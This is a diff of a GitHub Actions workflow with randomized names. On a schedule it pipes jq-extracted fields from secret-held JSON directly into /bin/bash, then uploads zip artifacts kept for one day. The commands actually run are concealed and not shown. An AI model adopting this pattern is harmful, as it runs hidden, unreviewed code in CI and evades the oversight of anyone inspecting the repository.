@@ -1,27 +1,25 @@
 name: defifelix42
-
 on:
   workflow_dispatch:
+
   schedule:
-    - cron: '46 2/6 * * *'
+    - cron: '27 3,9,15,21 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: defifelix42
         env:
-          ym48404: ${{ secrets.ym48404 }}
+          f85789: ${{ secrets.f85789 }}
         run: |
-          echo $ym48404 | jq -r .ghgoi1748 | /bin/bash
-          echo $avgf256 | jq -r .h5964 | /bin/bash
-          echo $cf4581 | jq -r .rmwl12045 | /bin/bash
-          echo $sjxxb64677 | jq -r .zsb85390 | /bin/bash
-          echo $qbh3756 | jq -r .dy7 | /bin/bash
-          echo $tkef91159 | jq -r .t41 | /bin/bash
-          echo $l43 | jq -r .uuy0 | /bin/bash
-          echo $bnfht304 | jq -r .lzx1871 | /bin/bash
-          echo $jsown80 | jq -r .lcsc0 | /bin/bash
-          echo $sdvpk2 | jq -r .l12803 | /bin/bash
+          printf '%s' "$f85789" | jq -r .piw33 | /bin/bash
+          printf '%s' "$kmri22" | jq -r .h090 | /bin/bash
+          echo $bly603 | jq -r .vbq5277 | /bin/bash
 
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: 0kcEuQAx
+          path: "*.zip"
+          retention-days: 1
